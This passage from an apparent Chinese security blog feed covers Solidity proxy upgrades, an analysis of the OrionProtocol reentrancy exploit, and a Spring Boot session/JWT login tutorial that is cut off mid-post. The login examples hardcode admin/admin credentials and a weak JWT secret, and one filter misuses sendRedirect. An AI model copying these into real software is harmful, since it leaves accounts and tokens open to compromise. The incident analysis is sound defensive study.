&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">get</span><span class="params">()</span> external view <span class="title">returns</span><span class="params">(uint256)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> number;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="function">function <span class="title">add</span><span class="params">(uint256 n)</span> external </span>&#123;</span><br><span class="line">    require(n &lt;= <span class="number">5</span>, <span class="string">&quot;Max increment is 5&quot;</span>);</span><br><span class="line">    number += n;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里添加了<code>isInitialized</code>存储变量和<code>initialize()</code>函数。与构造函数相比，<code>initialize()</code>函数只是一个普通的函数，可以被调用任意次数。由于安全敏感的参数经常在初始化过程中被设置，所以防止重新初始化是很重要的，我们在这里借助<code>isInitialized</code>来做到这一点。虽然这在这个简单的例子中是可行的，但对于生产来说，建议使用像OpenZeppelin的<a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#initializers">Initializable</a>这样的东西，它可以正确处理继承，并支持在升级后重新初始化。</p><h3 id="0x09-可成功升级的合约"><a href="#0x09-可成功升级的合约" class="headerlink" title="0x09 可成功升级的合约"></a>0x09 可成功升级的合约</h3><p>让我们创建一个 “CounterV2”合约，它与 “Counter” 类似，但将增量限制从5增加到10。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract CounterV2 &#123;</span><br><span class="line">  // ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  function add(uint256 n) external &#123;</span><br><span class="line">    require(n &lt;= 10, &quot;Max increment is 10&quot;); // Increase max increment to 10</span><br><span class="line">    number += n;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署以及合约升级的整个过程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// (1) Create logic contract</span><br><span class="line">Counter logic = new Counter();</span><br><span class="line"></span><br><span class="line">// (2) Create proxy and tell it which logic contract to use</span><br><span class="line">Proxy proxy = new Proxy();</span><br><span class="line">proxy.upgradeTo(address(logic));</span><br><span class="line"></span><br><span class="line">// (3) To be able to call functions from the logic contract, we need to</span><br><span class="line">//     cast the proxy to the right type</span><br><span class="line">Counter proxied = Counter(address(proxy));</span><br><span class="line">proxied.initialize(23);</span><br><span class="line"></span><br><span class="line">// (4) Now we treat the proxy as if it were the logic contract</span><br><span class="line">proxied.add(2); // Works as expected</span><br><span class="line">// proxied.add(7); Would fail (as expected)</span><br><span class="line"></span><br><span class="line">// (5) Upgrade to a new logic contract</span><br><span class="line">CounterV2 logicV2 = new CounterV2();</span><br><span class="line">proxy.upgradeTo(address(logicV2));</span><br><span class="line"></span><br><span class="line">// (6) Now adding a value larger than 5 actually works!</span><br><span class="line">proxied.add(7); // Works as expected</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在步骤（2）中，我们创建一个新的代理并分配逻辑合约，在步骤（3）中我们调用初始化函数。相比之下，OpenZeppelin的实现可以在一个步骤中完成所有这些工作（见<a href="https://docs.openzeppelin.com/contracts/4.x/api/proxy#ERC1967Proxy-constructor-address-bytes-">ERC1967Proxy.constructor()</a>），这可以防止前面的攻击，而且更节省Gas。</p><p>代理的存储结构如下</p><img src="/image/Upgradeable-Contract.assets/foundry_scheme.png" alt="进度计划" style="zoom:40%;" /><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract ProxyTest is Test &#123;</span><br><span class="line">    function testProxy() public &#123;</span><br><span class="line">        // (1) Create logic contract</span><br><span class="line">        Counter logic = new Counter();</span><br><span class="line"></span><br><span class="line">        // (2) Create proxy and tell it which logic contract to use</span><br><span class="line">        Proxy proxy = new Proxy();</span><br><span class="line">        proxy.upgradeTo(address(logic));</span><br><span class="line"></span><br><span class="line">        // (3) To be able to call functions from the logic contract, we need to</span><br><span class="line">        //     cast the proxy to the right type</span><br><span class="line">        Counter proxied = Counter(address(proxy));</span><br><span class="line">        proxied.initialize(23);</span><br><span class="line"></span><br><span class="line">        assertEq(proxied.get(), 23);</span><br><span class="line"></span><br><span class="line">        // (4) Now we treat the proxy as if it were the logic contract</span><br><span class="line">        proxied.add(2); // Works as expected</span><br><span class="line">        assertEq(proxied.get(), 25);</span><br><span class="line"></span><br><span class="line">        vm.expectRevert(&quot;Calling logic contract failed&quot;);</span><br><span class="line">        proxied.add(7); // Fails as expected</span><br><span class="line"></span><br><span class="line">        // (5) Upgrade to a new logic contract</span><br><span class="line">        proxy.upgradeTo(address(new CounterV2()));</span><br><span class="line"></span><br><span class="line">        // (6) Now adding a value larger than 5 actually works!</span><br><span class="line">        proxied.add(7);</span><br><span class="line">        assertEq(proxied.get(), 32);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/image/Upgradeable-Contract.assets/image-20230227154350154.png" alt="image-20230227154350154" style="zoom:50%;" /><h3 id="0x0A-代理合约的选择"><a href="#0x0A-代理合约的选择" class="headerlink" title="0x0A 代理合约的选择"></a>0x0A 代理合约的选择</h3><h4 id="10-1-如何防止代理和逻辑合约之间的存储槽碰撞？"><a href="#10-1-如何防止代理和逻辑合约之间的存储槽碰撞？" class="headerlink" title="10.1 如何防止代理和逻辑合约之间的存储槽碰撞？"></a>10.1 如何防止代理和逻辑合约之间的存储槽碰撞？</h4><p>在这篇文章中使用非结构化存储模式来解决这个问题，也可以使用Inherited 存储或 Eternal存储。</p><h4 id="10-2-如何处理代理和逻辑合约之间的函数选择器冲突？"><a href="#10-2-如何处理代理和逻辑合约之间的函数选择器冲突？" class="headerlink" title="10.2 如何处理代理和逻辑合约之间的函数选择器冲突？"></a>10.2 如何处理代理和逻辑合约之间的函数选择器冲突？</h4><p>函数在内部是由函数选择器来识别的，这些选择器有四个字节长，来自函数签名的keccak散列。这使得不同签名的函数有可能映射到同一个函数选择器上，从而导致选择器冲突。</p><p>例如，签名<code>proxyOwner()</code>和<code>clash550254402()</code>的函数选择器是一样的</p><img src="/image/Upgradeable-Contract.assets/image-20230227154818754.png" alt="image-20230227154818754" style="zoom:50%;" /><p>如果函数选择器冲突发生在单个合约的两个函数之间，那么 Solidity 编译器会以错误中止。然而，如果这样的冲突发生在<em>不同</em>合约的两个函数之间，那么就不会报告错误，因为这通常并不重要。但是，使用代理时除外。代理的回退函数会将任何它自己没有定义的函数转发给逻辑合约。现在，如果代理和逻辑合约定义了一个具有相同选择器的函数，那么代理将永远不会把对该函数的调用转发给逻辑合约，而是自己处理调用。更多信息请参见<a href="https://medium.com/nomic-foundation-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357">以太坊代理中的恶意后门</a>。</p><p>这个问题至少有两种流行的解决方案：透明代理模式和通用可升级代理标准(UUPS)。透明代理模式的工作原理是，根据信息发送者的情况，将<em>所有</em>功能调用转发到逻辑合约，或者完全不转发。如果消息发送者是一个指定的代理管理员，那么我们假设他们只想调用代理本身的功能，而不是逻辑合约。对他们来说，调用是不会被转发的。另一方面，对于任何其他用户，我们假设他们只想调用逻辑合约中的功能，因此他们的调用总是被转发。这就避免了任何源于函数选择器冲突的问题，因为发送者决定了应该使用哪个合约。更多信息，请参阅<a href="https://blog.openzeppelin.com/the-transparent-proxy-pattern/">透明代理模式</a>。</p><p>UUPS模式描述于<a href="https://eips.ethereum.org/EIPS/eip-1822">EIP-1822</a>。在这里，函数选择器冲突的问题是通过在代理中不定义<em>任何</em>公共函数来避免的。相反，所有管理代理的功能(包括<code>upgradeTo()</code>)都在逻辑合约中实现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;区块链的不可更改性与传统的软件开发过程有根本性的冲突，在传统的软件开发过程中，代码被不断地更新以修复</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>OrionProtocol攻击分析</title>
    <link href="https://banana69.site/2023/02/05/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    <id>https://banana69.site/2023/02/05/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</id>
    <published>2023-02-05T15:37:00.000Z</published>
    <updated>2023-02-23T13:45:55.369Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230205233801445.png" alt="image-20230205233801445"></p><h3 id="0x01-事件背景"><a href="#0x01-事件背景" class="headerlink" title="0x01 事件背景"></a>0x01 事件背景</h3><p>2023.2.2 Ethereum和Binance链上OrionProtocol因为合约漏洞遭到重入攻击，损失 2844766 USDT （Ethereum）和 191606 BUSD (BSC)，价值约290 万美元。</p><p><strong><strong>Ethereum链过程分析：</strong></strong></p><p>攻击者地址：<code>0x837962b686fd5a407fb4e5f92e8be86a230484bd </code></p><p>攻击合约地址：<code>0x5061f7e6dfc1a867d945d0ec39ea2a33f772380a</code></p><p>攻击交易地址：<code>0xa6f63fcb6bec8818864d96a5b1bb19e8bd85ee37b2cc916412e720988440b2aa</code></p><p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230205234624029.png" alt="image-20230205234624029"></p><h3 id="0x02-攻击分析"><a href="#0x02-攻击分析" class="headerlink" title="0x02 攻击分析"></a>0x02 攻击分析</h3><p>攻击者创建<code>Token</code>合约后对该合约进行转移及授权，为后续攻击做准备。</p><p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230205235436377.png" alt="image-20230205235436377"></p><p>攻击者通过<strong>UNI-V2.swap</strong>方法借款并调用<code>ExchangeWithAtomic.swapThroughOrionPool</code>方法进行代币兑换，兑换路径为 </p><p><code>path=[USDC, 0x64acd987a8603eeaf1ee8e87addd512908599aec,USDT] </code></p><p>路径中的地址为 Token 合约地址，攻击者使用该合约进行回掉。</p><p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230206000105038.png" alt="image-20230206000105038"></p><p>由于 <code>Token</code> 合约中存在回掉，所以攻击者通过<code>Token.Transfer</code>继续回调<code>ExchangeWithAtomic.depositAsset</code>进行重入让存款金额累加，随后取款完成获利。<br><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230206000610272.png" alt="image-20230206000610272"></p><p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230206000737042.png" alt="image-20230206000737042"></p><h3 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h3><p>关键问题在<code>PoolFunctionality</code>合约的doSwapThroughOrionPool`函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function doSwapThroughOrionPool(</span><br><span class="line">        address user,</span><br><span class="line">        address to,</span><br><span class="line">        IPoolFunctionality.SwapData calldata swapData</span><br><span class="line">    ) external override returns (uint256 amountOut, uint256 amountIn) &#123;</span><br><span class="line">        bool withFactory = swapData.path.length &gt; 2 &amp;&amp;</span><br><span class="line">            (supportedFactories[swapData.path[0]] != FactoryType.UNSUPPORTED);</span><br><span class="line">        address curFactory = withFactory ? swapData.path[0] : factory;</span><br><span class="line">        address[] memory new_path;</span><br><span class="line"></span><br><span class="line">        uint256 tokenIndex = withFactory ? 1 : 0;</span><br><span class="line">        new_path = new address[](swapData.path.length - tokenIndex);</span><br><span class="line"></span><br><span class="line">        for ((uint256 i, uint256 j) = (tokenIndex, 0); i &lt; swapData.path.length; (++i, ++j)) &#123;</span><br><span class="line">            new_path[j] = swapData.path[i] == address(0) ? WETH : swapData.path[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (uint256 amount_spend_base_units, uint256 amount_receive_base_units) = (</span><br><span class="line">            LibUnitConverter.decimalToBaseUnit(</span><br><span class="line">                swapData.path[tokenIndex],</span><br><span class="line">                swapData.amount_spend</span><br><span class="line">            ),</span><br><span class="line">            LibUnitConverter.decimalToBaseUnit(</span><br><span class="line">                swapData.path[swapData.path.length - 1],</span><br><span class="line">                swapData.amount_receive</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        &#123;</span><br><span class="line">        (uint256 userAmountIn, uint256 userAmountOut) = _doSwapTokens(InternalSwapData(</span><br><span class="line">            user,</span><br><span class="line">            amount_spend_base_units,</span><br><span class="line">            amount_receive_base_units,</span><br><span class="line">            withFactory ? swapData.path[1] : swapData.path[0],</span><br><span class="line">            new_path,</span><br><span class="line">            swapData.is_exact_spend,</span><br><span class="line">            to,</span><br><span class="line">            curFactory,</span><br><span class="line">            supportedFactories[curFactory],</span><br><span class="line">            swapData.supportingFee</span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line">        //  Anyway user gave amounts[0] and received amounts[len-1]</span><br><span class="line">        amountOut = LibUnitConverter.baseUnitToDecimal(</span><br><span class="line">            swapData.path[tokenIndex],</span><br><span class="line">            userAmountIn</span><br><span class="line">        );</span><br><span class="line">        amountIn = LibUnitConverter.baseUnitToDecimal(</span><br><span class="line">            swapData.path[swapData.path.length - 1],</span><br><span class="line">            userAmountOut</span><br><span class="line">        );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后跟进到<code>_doSwapTokens</code>函数</p><p><img src="/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230206001644793.png" alt="image-20230206001644793"></p><p>在转账发生之后更新 curBalance，所以在faketoken的transfer新增一个回调功能，回调代码就是调用depositAsset函数，所以导致curBalance错误更新，然后攻击者在还完闪电贷之后调用withdraw提走资金 。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/image/OrionProtocol%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.assets/image-20230205233801445.png&quot; alt=&quot;image-20230205233801445&quot;&gt;&lt;/p&gt;</summary>
      
    
    
    
    <category term="区块链安全事件分析" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
    
    <category term="智能合约审计" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Java 登录认证</title>
    <link href="https://banana69.site/2023/02/04/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81/"/>
    <id>https://banana69.site/2023/02/04/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81/</id>
    <published>2023-02-04T09:36:53.000Z</published>
    <updated>2023-02-04T13:58:40.611Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>登录认证，估计是所有系统中最常见的功能了，并且也是最基础、最重要的功能。为了做好这一块而诞生了许多安全框架，比如最常见的Shiro、Spring Security等。</p><p>这篇文章介绍实际项目中如何运用安全框完成登录认证（<strong>「Authentication」</strong>）、权限授权（<strong>「Authorization」</strong>）等功能。</p><h3 id="登录认证的原理"><a href="#登录认证的原理" class="headerlink" title="登录认证的原理"></a>登录认证的原理</h3><p>登录认证（Authentication）的概念非常简单，就是通过一定手段对用户的身份进行确认，即判断用户的账户和密码是否正确。但是在Web系统中<strong>「HTTP请求是一个无状态的协议」</strong>。就是说浏览器每一次发送的请求都是独立的，对于浏览器来说，不会记住上一次的请求，所以在Web系统中确认了用户的身份后，需要某种机制来记住用户是否已经登陆过。</p><p>现在流行两种方式登录认证方式：<strong>「Session」</strong>和<strong>「JWT」</strong>，无论是哪种方式其原理都是Token机制，即保存凭证：</p><ol><li>前端发起登录认证请求</li><li>后端登录验证通过，返回给前端一个<strong>「凭证」</strong></li><li>前端发起新的请求时携带<strong>「凭证」</strong></li></ol><p>搭建一个springboot web项目。</p><p>创建一个实体类模拟用户：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>Session，是一种有状态的会话管理机制，其目的就是为了解决HTTP无状态请求带来的问题。</p><p>当用户登录认证请求通过时，服务端会将用户的信息存储起来，并生成一个<code>Session Id</code>发送给前端，前端将这个<code>Session Id</code>保存起来（一般是保存在Cookie中）。之后前端再发送请求时都携带<code>Session Id</code>，服务器端再根据这个<code>Session Id</code>来检查该用户有没有登录过：</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204174249136.png" alt="image-20230204174249136"></p><p>我们只需要在用户登录的时候将用户信息保存在<strong>HttpSession</strong>中就可以：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SessionController</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@PostMapping(&quot;login&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(<span class="meta">@RequestBody</span> User user, HttpSession session)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;admin&quot;</span>.equals(user.getUsername()) &amp;&amp; <span class="string">&quot;admin&quot;</span>.equals(user.getPassword()))&#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;user&quot;</span>,user);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;登录成功&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;登录失败，账号或密码错误&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;logout&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">logout</span><span class="params">(HttpSession session)</span></span>&#123;</span><br><span class="line">        session.removeAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;退出成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模拟一个接口，在用户访问web接口时，会首先判断该用户是否登录：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;api&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">api</span><span class="params">(HttpSession session)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 模拟各种api，访问之前都要检查有没有登录，没有登录就提示用户登录</span></span><br><span class="line">    User user = (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (user == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请先登录&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果有登录就调用业务层执行业务逻辑，然后返回数据</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未登录时无法调用接口</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204174522710.png" alt="image-20230204174522710"></p><p>调用登录接口</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204174546218.png" alt="image-20230204174546218"></p><p>当用户成功登录后就可以访问到相应的资源</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204174608949.png" alt="image-20230204174608949"></p><p>如果用户第一次访问某个服务器时，服务器响应数据时会在响应头的<code>Set-Cookie</code>标识里将<code>Session Id</code>返回给浏览器，浏览器就将标识中的数据存在<code>Cookie</code>中，浏览器后续访问服务器就会携带Cookie。</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204174911929.png" alt="image-20230204174911929"></p><p>每一个<code>Session Id</code>都对应一个<code>HttpSession</code>对象，服务器会根据这个<code>HttpSession</code>对象来检测这个客户端是否已经登录。</p><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>除登录接口外，其他接口都需要判断用户是否已经登录，都需要在Controller层里做判断，我们可以对每个接口过滤拦截，判断是否已经登录，如果没有登录就结束请求，若登录了就放行，这些操作都可以通过过滤器来实现：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFilter</span> <span class="keyword">extends</span> <span class="title">OncePerRequestFilter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doFilterInternal</span><span class="params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="comment">//登录这个接口直接放行</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;/login&quot;</span>.equals(request.getRequestURI())) &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        User user = (User) request.getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (user != <span class="keyword">null</span>) &#123;</span><br><span class="line">            filterChain.doFilter(request, response);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//未登录时访问其他接口</span></span><br><span class="line">        response.sendRedirect(<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.write(<span class="string">&quot;请先登录&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时Controller层中的接口就不需要写多余的登录判断逻辑了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;api&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">api</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="上下文对象"><a href="#上下文对象" class="headerlink" title="上下文对象"></a>上下文对象</h4><p>在有些情况下，就算加了过滤器后我们现在还不能在controller层将session代码去掉！因为在实际业务中对用户对象操作是非常常见的，而我们的业务代码一般都写在Service业务层，那么我们Service层想要操作用户对象还得从Controller那传参过来，就像这样：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;doSomething&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">api</span><span class="params">(HttpSession session)</span> </span>&#123;</span><br><span class="line">    User user = (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    <span class="comment">// 将用户对象传递给Service层</span></span><br><span class="line">    userService.doSomething(user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过SpringMVC提供的<code>RequestContextHolder</code>对象在程序任何地方获取到当前请求对象，从而获取保存在<code>HttpSession</code>中的用户对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RequestContext</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> HttpServletRequest <span class="title">getCurrentRequest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 通过`RequestContextHolder`获取当前request请求对象</span></span><br><span class="line">        <span class="keyword">return</span> ((ServletRequestAttributes)(RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> User <span class="title">getCurrentUser</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 通过request对象获取session对象，再获取当前用户对象</span></span><br><span class="line">        <span class="keyword">return</span> (User)getCurrentRequest().getSession().getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就可以在Service层直接调用该方法获取到用户对象：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        User user = RequestContext.getCurrentUser();</span><br><span class="line">        System.out.println(<span class="string">&quot;service层---当前登录用户对象：&quot;</span> + user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在Controller层调用Service</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;doSomething&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">api</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 各种业务操作</span></span><br><span class="line">    userService.doSomething();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;api成功返回数据&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204182048133.png" alt="image-20230204182048133"></p><h4 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h4><p>除了<code>Session</code>之外，目前比较流行的做法就是使用<code>JWT</code>（JSON Web Token）。关于 <code>JWT</code> 需要知道两个特性：</p><ol><li>可以将一段数据加密成一段字符串，也可以从这字符串解密回数据；</li><li>可以对这个字符串进行校验，比如有没有过期，有没有被篡改。</li></ol><p>有上面两个特性之后就可以用来做登录认证了。当用户登录成功的时候，服务器生成一个<code>JWT</code>字符串返回给浏览器，浏览器将<code>JWT</code>保存起来，在之后的请求中都携带上<code>JWT</code>，服务器再对这个<code>JWT</code>进行<strong>「校验」</strong>，校验通过的话就代表这个用户登录了。</p><p><img src="/image/Java-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81.assets/image-20230204182222295.png" alt="image-20230204182222295"></p><p><code>session</code>与<code>JWT</code>都是基于<strong>TOKEN</strong>机制，但是<code>Session</code>是有状态的，JWT是无状态的。即<code>Session</code>在服务端<strong>「保存了用户信息」</strong>，而<code>JWT</code>在服务端<strong>「没有保存任何信息」</strong>。当前端携带<code>Session Id</code>到服务端时，服务端要检查其对应的<code>HttpSession</code>中有没有保存用户信息，保存了就代表登录了。当使用<code>JWT</code>时，服务端只需要对这个字符串进行校验，校验通过就代表登录了。</p><h4 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h4><p>导入坐标：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>写一个 JWT 的工具类，提供生成和解析两个方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JwtUtil</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 防止JWT被篡改的密钥</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String SECRET_KEY = <span class="string">&quot;secretK@y&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> Duration EXPIRATION = Duration.ofHours(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成JWT</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userName 用户名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 